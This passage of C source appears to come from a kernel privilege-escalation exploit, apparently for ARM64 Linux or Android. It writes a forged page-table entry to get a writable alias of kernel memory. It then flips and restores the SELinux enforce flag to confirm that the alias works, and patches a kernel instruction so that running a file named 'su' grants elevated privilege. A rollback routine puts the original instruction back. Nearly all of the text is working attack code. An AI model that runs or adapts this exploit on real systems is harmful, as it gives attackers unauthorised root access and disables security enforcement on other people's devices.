    put_le(desc, 0x0040000040000711ULL, 8);   /* PA 0x40000000 | MT_NORMAL,AF,S | EL1 RW | UXN */
    put_le(patchw, SUGATE_GATE_PATCH, 4);
    put_le(origw, SUGATE_GATE_ORIG, 4);

    rc = run_rounds(SUGATE_PGD_ENTRY, desc, sizeof desc, r, 0);
    el(&e, "sugate alias entry addr=%#lx rounds=%d rc=%d", (unsigned long)SUGATE_PGD_ENTRY, r, rc);
    if (rc != 1)
        return -1;

    was = enforce_now();
    if (was == 0 || was == 1) {
        want = was ? 0 : 1;
        put_le(opp, (unsigned long long)want, 4);
        put_le(cur, (unsigned long long)was, 4);
        rc = run_rounds(enf_alias, opp, 4, r, 0);
        if (rc == 1) {
            usleep(200000);
            if (enforce_now() == want) {
                rc = run_rounds(enf_alias, cur, 4, r, 0);
                usleep(200000);
                el(&e, "sugate alias PROVEN via enforce %d->%d->%d (rc2=%d)", was, want,
                   enforce_now(), rc);
                if (rc == 1 && enforce_now() == was)
                    goto window_ok;
            } else {
                el(&e, "sugate alias NOT proven: wrote %#x via alias, enforce reads %d (wanted %d)",
                   want, enforce_now(), want);
                /* leave the flipped value corrected through the primary VA, the proven path */
                run_rounds(ENFORCE_ADDR, cur, 4, r, 0);
            }
        }
        el(&e, "sugate aborting before the text patch: window unproven (the entry write is inert "
               "if the slot was not ours to fill)");
        return -2;
    }
window_ok:
    el(&e, "sugate window check: enforce_now=%d %s", was,
       was < 0 ? "(unreadable by this uid: relying on the caller's exec witness)" : "(proven)");

    rc = run_rounds(gate_alias, patchw, sizeof patchw, r, 0);
    el(&e, "sugate patch addr=%#lx (=%#lx via alias) rounds=%d rc=%d", (unsigned long)gate_alias,
       (unsigned long)SUGATE_GATE_VA, r, rc);
    if (rc != 1) {
        int back = run_rounds(gate_alias, origw, sizeof origw, r, 0);
        el(&e, "sugate patch missed, rollback rc=%d", back);
        return back == 1 ? -3 : -4;
    }
    el(&e, "sugate patch written; caller must witness by execve of a file named su");
    return 0;
}

/* Put the gate back exactly as shipped.  The alias entry itself can stay: it only names a
 * window onto RAM, and zeroing it while anything still holds a TLB entry for that range
 * would turn a later touch into a fault.  A reboot clears both writes either way. */
int esc_sugate_revert(char *out, int cap)
{
    struct elog e = { out, cap, 0 };
    unsigned char origw[4];
    int rc;

    put_le(origw, SUGATE_GATE_ORIG, 4);
    rc = run_rounds(sugate_alias(SUGATE_GATE_VA), origw, sizeof origw, 24, 0);
    el(&e, "sugate revert rc=%d", rc);
    return rc == 1 ? 0 : -1;
}
#endif /* ESC_LIB */
